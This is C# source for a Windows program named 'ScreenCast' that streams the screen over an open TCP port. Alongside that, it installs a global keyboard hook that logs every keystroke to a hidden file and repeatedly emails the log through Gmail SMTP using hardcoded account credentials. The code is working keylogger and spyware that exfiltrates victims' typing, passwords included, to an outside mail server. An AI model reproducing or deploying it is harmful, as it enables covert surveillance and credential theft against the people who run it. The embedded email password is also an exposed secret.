using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace ScreenCast
{
    public partial class Main : Form
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                using (StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true))
                {
                    if (((Keys)vkCode).ToString() == "OemPeriod")
                    {
                        output.Write(".");
                    }
                    else if (((Keys)vkCode).ToString() == "Oemcomma")
                    {
                        output.Write(",");
                    }
                    else if (((Keys)vkCode).ToString() == "OemMinus")
                    {
                        output.Write("(_-)");
                    }
                    else if (((Keys)vkCode).ToString() == "Oemplus")
                    {
                        output.Write("(+=)");
                    }
                    else if (((Keys)vkCode).ToString() == "Oem5")
                    {
                        output.Write("\\");
                    }
                    else if (((Keys)vkCode).ToString() == "Space")
                    {
                        output.Write(" ");
                    }
                    else
                    {
                        output.Write(((Keys)vkCode).ToString());
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                String moduleName = currentModule.ModuleName;
                IntPtr moduleHandle = GetModuleHandle(moduleName);
                return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern IntPtr UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        private TcpListener listener;
        int port = 8090;

        public Main()
        {
            InitializeComponent();
        }

        private void Start()
        {
            // Create a TCP listener on the specified port
            listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Task.Run(() => AcceptClients());
        }

        private void AcceptClients()
        {
            while (true)
            {
                try
                {
                    TcpClient client = listener.AcceptTcpClient();
                    Task.Run(() => SendScreenFrames(client));
                }
                catch
                {
                }
            }
        }

        private void SendScreenFrames(TcpClient client)
        {
            const string Boundary = "MyFrame";
            using (NetworkStream stream = client.GetStream())
            {
                try
                {
                    string initialBoundary = "" +
                      $"HTTP/1.1 200 OK\r\n" +
                      $"Content-Type: multipart/x-mixed-replace; boundary=--{Boundary}\r\n\r\n";

                    byte[] initialBoundaryBytes = Encoding.ASCII.GetBytes(initialBoundary);
                    stream.Write(initialBoundaryBytes, 0, initialBoundaryBytes.Length);

                    while (client.Connected)
                    {
                        CaptureScreen(stream, Boundary);
                    }
                }
                catch { }
            }
        }

        private void CaptureScreen(NetworkStream stream, string boundary)
        {
            try
            {
                double factor = ScreenPercentage.scale();
                int width = ((int)(Screen.PrimaryScreen.Bounds.Width) * (int)(factor)) / 100;
                int height = ((int)(Screen.PrimaryScreen.Bounds.Height) * (int)(factor) / 100);

                using (var bmpScreenCapture = new Bitmap(width, height))
                using (var graphics = Graphics.FromImage(bmpScreenCapture))
                {
                    int boundX = Screen.PrimaryScreen.Bounds.X;
                    int boundY = Screen.PrimaryScreen.Bounds.Y;
                    graphics.CopyFromScreen(boundX, boundY, 0, 0, bmpScreenCapture.Size, CopyPixelOperation.SourceCopy);

                    using (var ms = new MemoryStream())
                    {
                        bmpScreenCapture.Save(ms, ImageFormat.Jpeg);
                        string header = $"--{boundary}\r\n" +
                                        $"Content-Type: image/jpeg\r\n" +
                                        $"Content-Length: {ms.Length}\r\n\r\n";

                        byte[] headerBytes = Encoding.ASCII.GetBytes(header);
                        stream.WriteAsync(headerBytes, 0, headerBytes.Length);
                        ms.Position = 0;
                        ms.CopyTo(stream);
                        stream.FlushAsync();
                    }
                }
            }
            catch { }
        }

        private void UpdateHTML()
        {
            string Ip = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
            string path = Environment.CurrentDirectory.Replace("\\bin\\Debug", "") + "\\index.html";
            string ImagePath = "http://" + Ip + ":" + port.ToString();
            string image = "<img src=\"" + ImagePath + "\" style=\"\r\n        height: 100%;\r\n        bottom: 0;\r\n        left: 0;\r\n        margin: auto;\r\n        overflow: auto;\r\n        right: 0;\r\n        top: 0px;\r\n        -o-object-fit: contain;\r\n        object-fit: contain;\r\n        border: none;\r\n        border-width: 0px;\r\n        border-color: white;\r\n        -webkit-user-drag: none;\r\n        user-drag: none;\r\n        user-select: none;\r\n        pointer-events: none;\r\n        position:fixed;\"/>";
            File.WriteAllText(path, image);
            try
            {
                Task.Delay(1000).Wait();
                Process.Start(path);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private async void SendEmailReport()
        {
            while (true)
            {
                string path = @"C:\ProgramData\mylog.txt";
                string content = "";

                try
                {
                    using (StreamReader sr = new StreamReader(path))
                    {
                        string line;
                        while ((line = sr.ReadLine()) != null)
                        {
                            content += line;
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Handle exception
                }

                string fromMail = "sabduhoshimov538@gmail.com";
                string fromPassword = "eakbfvoniqfnigku";
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(fromMail),
                    Subject = "IP Address Report",
                    Body = $"<html><body><h3>5 Minute Report:</h3><hr><br>{content}</body></html>",
                    IsBodyHtml = true
                };
                message.To.Add(new MailAddress(fromMail));

                using (var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(fromMail, fromPassword),
                    EnableSsl = true,
                })
                {
                    smtpClient.Send(message);
                }

                await Task.Delay(TimeSpan.FromMinutes(1)); // Send email report every 5 minutes
            }
        }

        static void DeleteLogFile()
        {
            string path = @"C:\ProgramData\mylog.txt";

            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch (Exception ex)
            {
                // Handle exception
            }
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Start();
            DeleteLogFile();
            hook = SetHook(llkProcedure);
            SendEmailReport();
        }

        [STAThread]
        static void MainMethod()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Main form = new Main();
            Application.Run(form);
            UnhookWindowsHookEx(hook);
        }
    }
}
